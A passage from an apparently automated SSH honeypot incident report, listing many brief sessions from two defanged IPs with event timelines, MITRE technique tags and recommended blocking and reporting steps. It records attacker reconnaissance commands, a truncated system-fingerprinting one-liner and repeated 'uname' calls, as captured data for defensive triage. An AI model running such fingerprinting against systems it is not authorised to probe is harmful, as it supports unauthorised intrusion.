| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:41:59` | `cowrie.session.connect` |
| `2026-08-11 08:42:00` | `cowrie.client.version` |
| `2026-08-11 08:42:00` | `cowrie.client.kex` |
| `2026-08-11 08:42:01` | `cowrie.login.success` |
| `2026-08-11 08:42:03` | `cowrie.session.params` |
| `2026-08-11 08:42:03` | `cowrie.command.input` |
| `2026-08-11 08:42:03` | `cowrie.command.input` |
| `2026-08-11 08:42:03` | `cowrie.command.input` |
| `2026-08-11 08:42:03` | `cowrie.command.input` |
| `2026-08-11 08:42:03` | `cowrie.command.input` |
| `2026-08-11 08:42:03` | `cowrie.command.success` |
| `2026-08-11 08:42:03` | `cowrie.command.input` |
| `2026-08-11 08:42:03` | `cowrie.command.input` |
| `2026-08-11 08:42:03` | `cowrie.command.input` |
| `2026-08-11 08:42:03` | `cowrie.command.input` |
| `2026-08-11 08:42:03` | `cowrie.log.closed` |
| `2026-08-11 08:42:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ba60062f03e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 08:44 |
| **Last Seen** | 2026-08-11 08:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:44:18` | `cowrie.session.connect` |
| `2026-08-11 08:44:18` | `cowrie.client.version` |
| `2026-08-11 08:44:18` | `cowrie.client.kex` |
| `2026-08-11 08:44:19` | `cowrie.login.success` |
| `2026-08-11 08:44:21` | `cowrie.session.params` |
| `2026-08-11 08:44:21` | `cowrie.command.input` |
| `2026-08-11 08:44:21` | `cowrie.command.input` |
| `2026-08-11 08:44:21` | `cowrie.command.input` |
| `2026-08-11 08:44:21` | `cowrie.command.input` |
| `2026-08-11 08:44:21` | `cowrie.command.input` |
| `2026-08-11 08:44:21` | `cowrie.command.success` |
| `2026-08-11 08:44:21` | `cowrie.command.input` |
| `2026-08-11 08:44:21` | `cowrie.command.input` |
| `2026-08-11 08:44:21` | `cowrie.command.input` |
| `2026-08-11 08:44:21` | `cowrie.command.input` |
| `2026-08-11 08:44:21` | `cowrie.log.closed` |
| `2026-08-11 08:44:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-174d34eb1154

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:45 |
| **Last Seen** | 2026-08-11 08:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:45:44` | `cowrie.session.connect` |
| `2026-08-11 08:45:44` | `cowrie.client.version` |
| `2026-08-11 08:45:44` | `cowrie.client.kex` |
| `2026-08-11 08:45:45` | `cowrie.login.success` |
| `2026-08-11 08:45:47` | `cowrie.session.params` |
| `2026-08-11 08:45:47` | `cowrie.command.input` |
| `2026-08-11 08:45:47` | `cowrie.log.closed` |
| `2026-08-11 08:45:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-804d1ad9a398

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:45 |
| **Last Seen** | 2026-08-11 08:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:45:50` | `cowrie.session.connect` |
| `2026-08-11 08:45:50` | `cowrie.client.version` |
| `2026-08-11 08:45:50` | `cowrie.client.kex` |
| `2026-08-11 08:45:52` | `cowrie.login.success` |
| `2026-08-11 08:45:53` | `cowrie.session.params` |
| `2026-08-11 08:45:53` | `cowrie.command.input` |
| `2026-08-11 08:45:54` | `cowrie.log.closed` |
| `2026-08-11 08:45:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d794300783fb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:45 |
| **Last Seen** | 2026-08-11 08:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:45:55` | `cowrie.session.connect` |
| `2026-08-11 08:45:56` | `cowrie.client.version` |
| `2026-08-11 08:45:56` | `cowrie.client.kex` |
| `2026-08-11 08:45:57` | `cowrie.login.success` |
| `2026-08-11 08:45:58` | `cowrie.session.params` |
| `2026-08-11 08:45:58` | `cowrie.command.input` |
| `2026-08-11 08:45:59` | `cowrie.log.closed` |
| `2026-08-11 08:45:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a20817e4f243

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:46 |
| **Last Seen** | 2026-08-11 08:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:46:01` | `cowrie.session.connect` |
| `2026-08-11 08:46:01` | `cowrie.client.version` |
| `2026-08-11 08:46:01` | `cowrie.client.kex` |
| `2026-08-11 08:46:02` | `cowrie.login.success` |
| `2026-08-11 08:46:02` | `cowrie.session.params` |
| `2026-08-11 08:46:02` | `cowrie.command.input` |
| `2026-08-11 08:46:03` | `cowrie.log.closed` |
| `2026-08-11 08:46:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9102118b8227

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:46 |
| **Last Seen** | 2026-08-11 08:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:46:07` | `cowrie.session.connect` |
| `2026-08-11 08:46:07` | `cowrie.client.version` |
| `2026-08-11 08:46:07` | `cowrie.client.kex` |
| `2026-08-11 08:46:07` | `cowrie.login.success` |
| `2026-08-11 08:46:08` | `cowrie.session.params` |
| `2026-08-11 08:46:08` | `cowrie.command.input` |
| `2026-08-11 08:46:09` | `cowrie.log.closed` |
| `2026-08-11 08:46:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1b5465101e6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:46 |
| **Last Seen** | 2026-08-11 08:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:46:12` | `cowrie.session.connect` |
| `2026-08-11 08:46:12` | `cowrie.client.version` |
| `2026-08-11 08:46:12` | `cowrie.client.kex` |
| `2026-08-11 08:46:13` | `cowrie.login.success` |
| `2026-08-11 08:46:14` | `cowrie.session.params` |
| `2026-08-11 08:46:14` | `cowrie.command.input` |
| `2026-08-11 08:46:14` | `cowrie.log.closed` |
| `2026-08-11 08:46:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18ba23c3e22c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:46 |
| **Last Seen** | 2026-08-11 08:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:46:17` | `cowrie.session.connect` |
| `2026-08-11 08:46:17` | `cowrie.client.version` |
| `2026-08-11 08:46:17` | `cowrie.client.kex` |
| `2026-08-11 08:46:18` | `cowrie.login.success` |
| `2026-08-11 08:46:19` | `cowrie.session.params` |
| `2026-08-11 08:46:19` | `cowrie.command.input` |
| `2026-08-11 08:46:19` | `cowrie.log.closed` |
| `2026-08-11 08:46:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af8e4233aac8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 08:46 |
| **Last Seen** | 2026-08-11 08:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:46:22` | `cowrie.session.connect` |
| `2026-08-11 08:46:22` | `cowrie.client.version` |
| `2026-08-11 08:46:22` | `cowrie.client.kex` |
| `2026-08-11 08:46:23` | `cowrie.login.success` |
| `2026-08-11 08:46:25` | `cowrie.session.params` |
| `2026-08-11 08:46:25` | `cowrie.command.input` |
| `2026-08-11 08:46:25` | `cowrie.command.input` |
| `2026-08-11 08:46:25` | `cowrie.command.input` |
| `2026-08-11 08:46:25` | `cowrie.command.input` |
| `2026-08-11 08:46:25` | `cowrie.command.input` |
| `2026-08-11 08:46:25` | `cowrie.command.success` |
| `2026-08-11 08:46:25` | `cowrie.command.input` |
| `2026-08-11 08:46:25` | `cowrie.command.input` |
| `2026-08-11 08:46:25` | `cowrie.command.input` |
| `2026-08-11 08:46:25` | `cowrie.command.input` |
| `2026-08-11 08:46:26` | `cowrie.log.closed` |
| `2026-08-11 08:46:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddecea33f467

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:46 |
| **Last Seen** | 2026-08-11 08:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:46:22` | `cowrie.session.connect` |
| `2026-08-11 08:46:23` | `cowrie.client.version` |
| `2026-08-11 08:46:23` | `cowrie.client.kex` |
| `2026-08-11 08:46:23` | `cowrie.login.success` |
| `2026-08-11 08:46:24` | `cowrie.session.params` |
| `2026-08-11 08:46:24` | `cowrie.command.input` |
| `2026-08-11 08:46:24` | `cowrie.log.closed` |
| `2026-08-11 08:46:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23997ae1a80a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:46 |
| **Last Seen** | 2026-08-11 08:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:46:28` | `cowrie.session.connect` |
| `2026-08-11 08:46:28` | `cowrie.client.version` |
| `2026-08-11 08:46:28` | `cowrie.client.kex` |
| `2026-08-11 08:46:28` | `cowrie.login.success` |
| `2026-08-11 08:46:29` | `cowrie.session.params` |
| `2026-08-11 08:46:29` | `cowrie.command.input` |
| `2026-08-11 08:46:29` | `cowrie.log.closed` |
| `2026-08-11 08:46:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9e535082519

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:46 |
| **Last Seen** | 2026-08-11 08:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:46:33` | `cowrie.session.connect` |
| `2026-08-11 08:46:33` | `cowrie.client.version` |
| `2026-08-11 08:46:33` | `cowrie.client.kex` |
| `2026-08-11 08:46:34` | `cowrie.login.success` |
| `2026-08-11 08:46:35` | `cowrie.session.params` |
| `2026-08-11 08:46:35` | `cowrie.command.input` |
| `2026-08-11 08:46:35` | `cowrie.log.closed` |
| `2026-08-11 08:46:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3109050f6cff

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:46 |
| **Last Seen** | 2026-08-11 08:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:46:38` | `cowrie.session.connect` |
| `2026-08-11 08:46:38` | `cowrie.client.version` |
| `2026-08-11 08:46:38` | `cowrie.client.kex` |
| `2026-08-11 08:46:39` | `cowrie.login.success` |
| `2026-08-11 08:46:40` | `cowrie.session.params` |
| `2026-08-11 08:46:40` | `cowrie.command.input` |
| `2026-08-11 08:46:40` | `cowrie.log.closed` |
| `2026-08-11 08:46:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dc115d9de3a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:46 |
| **Last Seen** | 2026-08-11 08:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:46:44` | `cowrie.session.connect` |
| `2026-08-11 08:46:44` | `cowrie.client.version` |
| `2026-08-11 08:46:44` | `cowrie.client.kex` |
| `2026-08-11 08:46:44` | `cowrie.login.success` |
| `2026-08-11 08:46:45` | `cowrie.session.params` |
| `2026-08-11 08:46:45` | `cowrie.command.input` |
| `2026-08-11 08:46:45` | `cowrie.log.closed` |
| `2026-08-11 08:46:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a32886e16f26

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:46 |
| **Last Seen** | 2026-08-11 08:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:46:49` | `cowrie.session.connect` |
| `2026-08-11 08:46:49` | `cowrie.client.version` |
| `2026-08-11 08:46:49` | `cowrie.client.kex` |
| `2026-08-11 08:46:49` | `cowrie.login.success` |
| `2026-08-11 08:46:50` | `cowrie.session.params` |
| `2026-08-11 08:46:50` | `cowrie.command.input` |
| `2026-08-11 08:46:50` | `cowrie.log.closed` |
| `2026-08-11 08:46:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-645bd8909987

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:46 |
| **Last Seen** | 2026-08-11 08:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:46:54` | `cowrie.session.connect` |
| `2026-08-11 08:46:54` | `cowrie.client.version` |
| `2026-08-11 08:46:54` | `cowrie.client.kex` |
| `2026-08-11 08:46:55` | `cowrie.login.success` |
| `2026-08-11 08:46:55` | `cowrie.session.params` |
| `2026-08-11 08:46:55` | `cowrie.command.input` |
| `2026-08-11 08:46:55` | `cowrie.log.closed` |
| `2026-08-11 08:46:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a73b95a820e2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:46 |
| **Last Seen** | 2026-08-11 08:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:46:59` | `cowrie.session.connect` |
| `2026-08-11 08:46:59` | `cowrie.client.version` |
| `2026-08-11 08:46:59` | `cowrie.client.kex` |
| `2026-08-11 08:47:00` | `cowrie.login.success` |
| `2026-08-11 08:47:01` | `cowrie.session.params` |
| `2026-08-11 08:47:01` | `cowrie.command.input` |
| `2026-08-11 08:47:01` | `cowrie.log.closed` |
| `2026-08-11 08:47:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6023abc16e4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:47 |
| **Last Seen** | 2026-08-11 08:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:47:04` | `cowrie.session.connect` |
| `2026-08-11 08:47:04` | `cowrie.client.version` |
| `2026-08-11 08:47:05` | `cowrie.client.kex` |
| `2026-08-11 08:47:05` | `cowrie.login.success` |
| `2026-08-11 08:47:06` | `cowrie.session.params` |
| `2026-08-11 08:47:06` | `cowrie.command.input` |
| `2026-08-11 08:47:06` | `cowrie.log.closed` |
| `2026-08-11 08:47:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f27c3372d389

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:47 |
| **Last Seen** | 2026-08-11 08:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:47:10` | `cowrie.session.connect` |
| `2026-08-11 08:47:10` | `cowrie.client.version` |
| `2026-08-11 08:47:10` | `cowrie.client.kex` |
| `2026-08-11 08:47:10` | `cowrie.login.success` |
| `2026-08-11 08:47:11` | `cowrie.session.params` |
| `2026-08-11 08:47:11` | `cowrie.command.input` |
| `2026-08-11 08:47:11` | `cowrie.log.closed` |
| `2026-08-11 08:47:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f40844649e3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:47 |
| **Last Seen** | 2026-08-11 08:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:47:15` | `cowrie.session.connect` |
| `2026-08-11 08:47:15` | `cowrie.client.version` |
| `2026-08-11 08:47:15` | `cowrie.client.kex` |
| `2026-08-11 08:47:16` | `cowrie.login.success` |
| `2026-08-11 08:47:17` | `cowrie.session.params` |
| `2026-08-11 08:47:17` | `cowrie.command.input` |
| `2026-08-11 08:47:17` | `cowrie.log.closed` |
| `2026-08-11 08:47:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22a3440d10cd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:47 |
| **Last Seen** | 2026-08-11 08:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:47:21` | `cowrie.session.connect` |
| `2026-08-11 08:47:21` | `cowrie.client.version` |
| `2026-08-11 08:47:21` | `cowrie.client.kex` |
| `2026-08-11 08:47:21` | `cowrie.login.success` |
| `2026-08-11 08:47:22` | `cowrie.session.params` |
| `2026-08-11 08:47:22` | `cowrie.command.input` |
| `2026-08-11 08:47:22` | `cowrie.log.closed` |
| `2026-08-11 08:47:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f3645df1b6c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:47 |
| **Last Seen** | 2026-08-11 08:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:47:26` | `cowrie.session.connect` |
| `2026-08-11 08:47:26` | `cowrie.client.version` |
| `2026-08-11 08:47:26` | `cowrie.client.kex` |
| `2026-08-11 08:47:26` | `cowrie.login.success` |
